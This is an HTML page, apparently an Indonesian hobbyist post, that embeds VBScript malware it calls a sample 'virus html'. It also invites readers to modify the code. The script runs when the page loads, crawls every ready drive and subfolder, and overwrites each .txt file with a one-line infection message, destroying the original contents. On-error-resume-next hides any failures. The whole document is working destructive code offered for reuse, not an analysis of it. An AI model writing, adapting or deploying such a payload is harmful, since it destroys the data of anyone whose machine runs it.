<html><body>
<Script Language="VBScript"><!--
'Contoh sederhana virus penginfeksi file txt
'Dibuat oleh sevenC
Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set fso = createobject("scripting.filesystemobject")
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next 
function Dosearch(path)
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="txt" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline"File ini telah terinfeksi virus"
drop.close
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next 
end function 
--></script></body</html>
<html><head><title>Contoh virus html</title></head><body bgcolor="Black"><h3 align ="center"><font color="white">Contoh virus html<br>created by ( n0:7 )<br>http://trax.to/sevenC<br><br><br><br>Ini contoh virus html....gw harap you bisa memodifikasinya lagi..... OK.... <br>sevenC<br>mailto:sevenC_zone@yahoo.com</p></h></font></body</html>